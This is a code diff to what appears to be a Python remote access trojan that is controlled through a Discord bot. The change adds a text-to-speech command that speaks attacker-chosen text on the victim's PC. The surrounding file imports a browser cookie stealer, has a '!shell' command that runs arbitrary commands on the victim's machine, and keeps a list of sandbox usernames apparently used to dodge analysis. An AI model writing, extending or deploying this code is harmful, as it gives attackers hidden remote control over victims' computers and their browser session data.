@@ -1,6 +1,7 @@
-import pyautogui, cv2, time, threading, win32api, discord, requests, os, json, psutil, ctypes, rotatescreen as rs, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, re, inspect, urllib, platform, shutil
+import pyautogui, cv2, time, playsound, threading, win32api, discord, requests, os, json, psutil, ctypes, rotatescreen as rs, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, re, inspect, urllib, platform, shutil
 from discord.ext import commands
 from PIL import Image
+from gtts import gTTS
 from ctypes import Structure, windll, c_uint, sizeof, byref
 
 client = commands.Bot(command_prefix='!',intents=discord.Intents.all())
@@ -96,6 +97,7 @@ help_menu2 = """
 **!opensite** - Opens a site on the user's browser.
 **!key_press** - Press a key.
 **!showtaskbar** \ **!hidetaskbar**
+**!tts (text)** - Text to speech.
 
 `-----COMMUNICATION-----`
 
@@ -944,6 +946,22 @@ async def shell(ctx, usid, *, command=""):
                 await ctx.send(f'An error occurred: {str(e)}')
         else:
             await ctx.send(f"Please input a shell command for **{os.getlogin()}**")
+
+@client.command()
+async def tts(ctx, usid, *, text=""):
+    if usid == clientid:
+        if text != "":
+            try:
+                await ctx.send(f"Started saying **{text}** on **{os.getlogin()}**'s PC.")
+                tts = gTTS(text=text, lang='en')
+                tts.save('tts.mp3')
+                playsound.playsound('tts.mp3', True)
+                os.remove('tts.mp3')
+                await ctx.send(f"Finished saying **{text}** on **{os.getlogin()}**'s PC.")
+            except: pass
+        elif text == "":
+            await ctx.send(f"Please input something to say on **{os.getlogin()}**'s PC.")
+
 
 def mainfunc():
     bluser = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
